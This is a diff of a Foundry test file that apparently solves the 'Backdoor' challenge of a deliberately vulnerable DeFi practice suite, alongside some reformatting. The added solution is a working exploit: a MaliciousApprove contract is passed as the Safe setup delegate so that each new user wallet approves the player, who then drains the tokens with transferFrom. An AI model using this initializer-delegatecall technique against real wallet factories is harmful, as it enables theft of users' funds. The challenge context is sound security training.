@@ -7,12 +7,19 @@ import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
+import {IProxyCreationCallback} from "@safe-global/safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];
+    address[] users = [
+        makeAddr("alice"),
+        makeAddr("bob"),
+        makeAddr("charlie"),
+        makeAddr("david")
+    ];
 
     uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
 
@@ -41,7 +48,12 @@ contract BackdoorChallenge is Test {
         token = new DamnValuableToken();
 
         // Deploy the registry
-        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);
+        walletRegistry = new WalletRegistry(
+            address(singletonCopy),
+            address(walletFactory),
+            address(token),
+            users
+        );
 
         // Transfer tokens to be distributed to the registry
         token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);
@@ -52,9 +64,12 @@ contract BackdoorChallenge is Test {
     /**
      * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
      */
-    function test_assertInitialState() public {
+    function test_assertInitialState_backdoor() public {
         assertEq(walletRegistry.owner(), deployer);
-        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
+        assertEq(
+            token.balanceOf(address(walletRegistry)),
+            AMOUNT_TOKENS_DISTRIBUTED
+        );
         for (uint256 i = 0; i < users.length; i++) {
             // Users are registered as beneficiaries
             assertTrue(walletRegistry.beneficiaries(users[i]));
@@ -70,7 +85,43 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        MaliciousApprove maliciousApprove = new MaliciousApprove();
+
+        for (uint256 i = 0; i < users.length; i++) {
+            address[] memory owners = new address[](1);
+            owners[0] = users[i];
+
+            bytes memory maliciousData = abi.encodeWithSelector(
+                maliciousApprove.approve.selector,
+                address(token),
+                player,
+                10e18
+            );
+
+            bytes memory maliciousInitializer = abi.encodeWithSelector(
+                Safe.setup.selector,
+                owners,
+                1,
+                address(maliciousApprove),
+                maliciousData,
+                address(0),
+                address(0),
+                0,
+                address(0)
+            );
+
+            address proxy = address(
+                walletFactory.createProxyWithCallback(
+                    address(singletonCopy),
+                    maliciousInitializer,
+                    i,
+                    IProxyCreationCallback(address(walletRegistry))
+                )
+            );
+
+            // 从钱包转走代币到 recovery 地址
+            token.transferFrom(proxy, recovery, 10e18);
+        }
     }
 
     /**
@@ -92,5 +143,11 @@ contract BackdoorChallenge is Test {
 
         // Recovery account must own all tokens
         assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
+    }
+}
+
+contract MaliciousApprove {
+    function approve(address token, address spender, uint256 amount) external {
+        IERC20(token).approve(spender, amount);
     }
 }
